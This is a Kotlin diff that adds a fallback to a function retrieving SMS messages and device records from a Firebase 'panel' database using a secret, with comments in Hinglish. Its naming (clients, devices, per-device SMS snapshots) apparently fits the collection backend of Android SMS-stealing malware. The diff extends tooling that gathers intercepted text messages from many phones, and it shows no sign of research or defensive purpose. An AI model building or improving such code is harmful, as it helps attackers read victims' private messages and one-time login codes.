@@ -93,7 +93,11 @@ suspend fun fetchSmsFromFirebase(panel: FirebasePanel): FetchResult =
                     val clientsNode = clientsResult.json
                     val deviceEntries = parseClientsObject(clientsNode)
                     if (deviceEntries.isEmpty()) {
-                        return@withContext FetchResult(base, true, emptyList(), emptyMap(), "clients empty", usedAuth = true)
+                        val fallback = fetchAuthMessagesTreeFallback(base, secret)
+                        if (fallback.sms.isNotEmpty()) {
+                            return@withContext fallback.copy(usedAuth = true)
+                        }
+                        return@withContext FetchResult(base, true, emptyList(), emptyMap(), "clients empty · messages bhi khali", usedAuth = true)
                     }
                     val snapshots =
                         deviceEntries.mapValues { (id, obj) ->
@@ -129,6 +133,25 @@ suspend fun fetchSmsFromFirebase(panel: FirebasePanel): FetchResult =
         }
         legacy
     }
+
+/** Kuch DB me `clients` {} hota hai lekin `messages/` pe SMS hota — auth path pe walk karo. */
+private fun fetchAuthMessagesTreeFallback(base: String, secret: String): FetchResult {
+    return try {
+        when (val root = firebaseGetJson(base, secret, "", emptyMap())) {
+            is HttpJsonResult.Ok -> {
+                val payload = parsePayload(root.json, "")
+                val cap = trimCap(payload.sms.toMutableList())
+                FetchResult(base, cap.isNotEmpty(), cap, payload.devices, if (cap.isEmpty()) "messages tree empty" else null, usedAuth = true)
+            }
+            is HttpJsonResult.Forbidden ->
+                FetchResult(base, false, emptyList(), emptyMap(), "Auth fail (403) — check Secret", usedAuth = true)
+            is HttpJsonResult.Fail ->
+                FetchResult(base, false, emptyList(), emptyMap(), root.message ?: "root fetch fail", usedAuth = true)
+        }
+    } catch (e: Exception) {
+        FetchResult(base, false, emptyList(), emptyMap(), e.message, usedAuth = true)
+    }
+}
 
 private sealed class HttpJsonResult {
     data class Ok(val json: JSONObject) : HttpJsonResult()
